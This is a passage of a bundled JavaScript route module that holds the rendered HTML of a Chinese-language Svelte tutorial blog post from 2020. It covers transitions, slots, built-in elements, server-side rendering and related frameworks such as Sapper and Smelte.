採用將獨自的語法計算轉換成原生 css 動畫，因此較不會有效能問題</p>\n</li>\n<li><p>亦可搭配 svelte 的其它語法</p>\n</li>\n<li><p>有兩個通用參數\n├ <code>delay</code>：延遲多久開始 transition\n└ <code>duration</code>：transition 持續多久</p>\n</li>\n<li><p>以及各個動畫獨有的參數可以設定\n└ <code>&lt;h1 in:fade out:fly={{ x: 0, y: 50 }}&gt;I&#39;m Transition!&lt;/h1&gt;</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> fade<span class=\"token punctuation\">,</span> fly <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"svelte/transition\"</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n{#if condition}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\"><span class=\"token namespace\">transition:</span>fade</span><span class=\"token punctuation\">></span></span>I'm Transition!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\"><span class=\"token namespace\">in:</span>fade</span> <span class=\"token attr-name\"><span class=\"token namespace\">out:</span>fly</span><span class=\"token punctuation\">></span></span>I'm Transition!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n{/if}</code></pre></li>\n<li><p>easing function：緩動函數，替移動加上緩急，讓動靜看起來更真實且活潑</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> fade<span class=\"token punctuation\">,</span> fly <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"svelte/transition\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> elasticOut <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'svelte/easing'</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> condition <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> condition <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token number\">250</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> condition <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2250</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n{#if condition}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\"><span class=\"token namespace\">in:</span>fade</span> <span class=\"token attr-name\"><span class=\"token namespace\">out:</span>fly</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>{{</span> <span class=\"token attr-name\"><span class=\"token namespace\">x:</span></span> <span class=\"token attr-name\">0,</span> <span class=\"token attr-name\"><span class=\"token namespace\">y:</span></span> <span class=\"token attr-name\">100,</span> <span class=\"token attr-name\"><span class=\"token namespace\">easing:</span></span> <span class=\"token attr-name\">ealsticOut</span> <span class=\"token attr-name\">}}</span><span class=\"token punctuation\">></span></span>\n  I'm Transition!\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n{/if}</code></pre></li>\n<li><p>也可以自訂轉場函式</p>\n<pre class=\"language-html\"><code class=\"language-html\">  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n    <span class=\"token keyword\">let</span> condition <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">node<span class=\"token punctuation\">,</span> params</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">loog</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">const</span> duration <span class=\"token operator\">=</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n\n      <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>\n        duration<span class=\"token punctuation\">,</span>\n        easing<span class=\"token operator\">:</span> cubicOut<span class=\"token punctuation\">,</span>\n        <span class=\"token function-variable function\">css</span><span class=\"token operator\">:</span> <span class=\"token parameter\">t</span> <span class=\"token operator\">=></span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">\n          transform: rotate(</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>params<span class=\"token punctuation\">.</span>range <span class=\"token operator\">*</span> t<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">deg);\n        </span><span class=\"token template-punctuation string\">`</span></span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> condition <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n  {#if condition}\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\"><span class=\"token namespace\">transition:</span>rotate</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>{{</span> <span class=\"token attr-name\"><span class=\"token namespace\">range:</span></span> <span class=\"token attr-name\">180</span> <span class=\"token attr-name\">}}</span><span class=\"token punctuation\">></span></span>I'm Transition<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span>\n  {/if}</code></pre></li>\n<li><p>svelte 還有 <code>animate</code> 可供當列表遇到重新整理時執行\n├ <code>animate</code> 中有提供 FLIP（First, Last, Invert, Play）\n│ 會先計算兩者之間的距離後才執行動畫</p>\n</li>\n</ul>\n<h2 id=\"樣板語法（slot）\">樣板語法（Slot）</h2>\n<ul>\n<li>可以將客製化元件／內容放進子元件中</li>\n</ul>\n<p><code>Card.svelte</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n  <span class=\"token selector\">.card</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 300px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span> #efefef<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 15px<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>slot</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>Default Text<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>slot</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><p><code>App.svelte</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> Card <span class=\"token keyword\">from</span> <span class=\"token string\">\"./Card.svelte\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> name <span class=\"token operator\">=</span> <span class=\"token string\">\"world\"</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>Card</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>Title<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>Body<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Card</span><span class=\"token punctuation\">></span></span></code></pre><ul>\n<li>可以替 slot 命名，讓元件能同時使用多個 slot</li>\n<li>也可以將變數傳給父元件</li>\n</ul>\n<p><code>Card.svelte</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n  <span class=\"token selector\">.card</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 300px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span> #efefef<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 15px<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token selector\">.image</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 150px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background-position</span><span class=\"token punctuation\">:</span> center<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background-size</span><span class=\"token punctuation\">:</span> cover<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background-repeat</span><span class=\"token punctuation\">:</span> no-repeat<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>slot</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card-image<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">imageURL</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{imageURL}<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>image<span class=\"token punctuation\">\"</span></span><span class=\"token style-attr language-css\"><span class=\"token attr-name\"> <span class=\"token attr-name\">style</span></span><span class=\"token punctuation\">=\"</span><span class=\"token attr-value\"><span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>{imageURL}<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>slot</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>slot</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card-body<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>Default Text<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>slot</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><p><code>App.svelte</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">import</span> Card <span class=\"token keyword\">from</span> <span class=\"token string\">\"./Card.svelte\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> name <span class=\"token operator\">=</span> <span class=\"token string\">\"world\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> title<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> imageURL<span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n  <span class=\"token selector\">img</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">max-width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n\n&lt;Card imageURL={''}>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">slot</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card-image<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">let:</span>imageURL</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>{imageURL}</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>{imageURL}</span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">slot</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card-body<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    Body\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Card</span><span class=\"token punctuation\">></span></span></code></pre><h2 id=\"內建-element\">內建 Element</h2>\n<ul>\n<li>svelte 會在正確的時間點幫忙處理自訂與銷毀監聽器，省去需要的麻煩</li>\n<li>可以幫忙處理 SSR 的問題</li>\n<li><code>&lt;svelte:self /&gt;</code>：遞迴使用元件</li>\n<li><code>&lt;svelte:window /&gt;</code>：操作 window 物件</li>\n<li><code>&lt;svelte:body /&gt;</code>：類似 <code>&lt;svelte:window /&gt;</code>，操作 body</li>\n<li><code>&lt;svelte:head /&gt;</code>：操作 head</li>\n<li><code>&lt;svelte:component /&gt;</code>：動態引入 svelte 元件</li>\n<li><code>&lt;svelte:options /&gt;</code>：對元件分別指定編譯選項</li>\n</ul>\n<pre class=\"language-svelte\"><code class=\"language-svelte\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">export</span> <span class=\"token keyword\">let</span> count <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n{#if count > 0}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>countdown ... {count}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">svelte:</span>self</span> <span class=\"token attr-name\">count</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>{count</span> <span class=\"token attr-name\">-</span> <span class=\"token attr-name\">1}</span> <span class=\"token punctuation\">/></span></span>\n{:else}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>empty<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n{/if}</code></pre><pre class=\"language-svelte\"><code class=\"language-svelte\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">let</span> innerWidth<span class=\"token punctuation\">;</span>\n  $<span class=\"token operator\">:</span> console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>innerWidth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">svelte:</span>window</span>\n  <span class=\"token attr-name\"><span class=\"token namespace\">bind:</span>innerWidth</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>{innerWidth}</span>\n<span class=\"token punctuation\">/></span></span></code></pre><h3 id=\"server-side-rendering\">Server-Side Rendering</h3>\n<p><code>server.js</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span>\n  <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"svelte/register\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">const</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'express'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">const</span> myApp <span class=\"token operator\">=</span>\n  <span class=\"token function\">express</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">const</span> App <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./App.svelte\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>default<span class=\"token punctuation\">;</span> <span class=\"token keyword\">const</span><span class=\"token punctuation\">{</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">{</span><span class=\"token punctuation\">(</span>html<span class=\"token punctuation\">,</span> css<span class=\"token punctuation\">,</span> head<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> App<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> myApp<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/public'</span><span class=\"token punctuation\">,</span>\n  express<span class=\"token punctuation\">.</span><span class=\"token function\">static</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./public'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> myApp<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span><span class=\"token punctuation\">{</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">{</span>res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">\n    &lt;html>\n      &lt;head>\n        </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>head<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\n\n        &lt;style>\n          </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>css<span class=\"token punctuation\">.</span>code<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\n        &lt;/style>\n      &lt;/head>\n      &lt;body>\n        </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>html<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\n        &lt;script src=\"/public/build/bundle.js\">&lt;/script>\n      &lt;/body>\n    &lt;/html></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">)</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></code></pre><p><code>main.js</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">import</span> App <span class=\"token keyword\">from</span> <span class=\"token string\">\"./App.svelte\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">App</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  hydrate<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  target<span class=\"token operator\">:</span> document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> app<span class=\"token punctuation\">;</span></code></pre><p><code>rollup.config.js</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">  <span class=\"token operator\">...</span>\n  plugins<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token function\">svelte</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n      hydratable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n      <span class=\"token operator\">...</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">]</span></code></pre><h2 id=\"sveltekit\">SvelteKit</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://svelte.dev/blog/whats-the-deal-with-sveltekit\">What&#39;s the deal with SvelteKit?</a></li>\n</ul>\n<h2 id=\"sapper\">Sapper</h2>\n<ul>\n<li>svelte 的網頁框架，類似於 Vue 的 Nuxt.js</li>\n</ul>\n<h3 id=\"安裝-1\">安裝</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\"># for Rollup\nnpx degit \"sveltejs/sapper-template#rollup\" my-app\n\n# for webpack\nnpx degit \"sveltejs/sapper-template#webpack\" my-app</code></pre><h2 id=\"smelte\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://smeltejs.com/?ref=madewithsvelte.com\">Smelte</a></h2>\n<ul>\n<li>svelte 的 CSS 框架，類似於 Vue 的 Vuetify</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/azukisiromochi/items/969fc9808c931cfadf22\">Sapper で Smelte を利用する - Qiita</a></li>\n</ul>\n<h3 id=\"安裝-2\">安裝</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">npx degit matyunya/smelte-sapper-template my-app\ncd my-app\nnpm run dev</code></pre><h2 id=\"routify\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://routify.dev/\">Routify</a></h2>\n<h2 id=\"參考文章\">參考文章</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://sapper.svelte.dev/docs/\">Docs • Sapper</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gist.github.com/peltho/ad6e051b854cd3095f9e7f9d9c550a84\">Svelte cheatsheet</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/irico/items/3875c7ee6423cdf09392\">Svelte チュートリアルやってみた - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/nishinoshake/items/46a64591c6411af68af1#svelte\">Svelte で Web サイトを作ってみて感じた魅力 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/myLifeAsaDog/items/5d3036201f37a98e685d\">Svelte のドキュメントを翻訳してみた - Qiita</a></li>\n</ul>\n","date":"2020-08-12T22:05:02.000Z","excerpt":"","printDate":"August 12, 2020","printReadingTime":"9 min read"};

var route_77 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod72
});

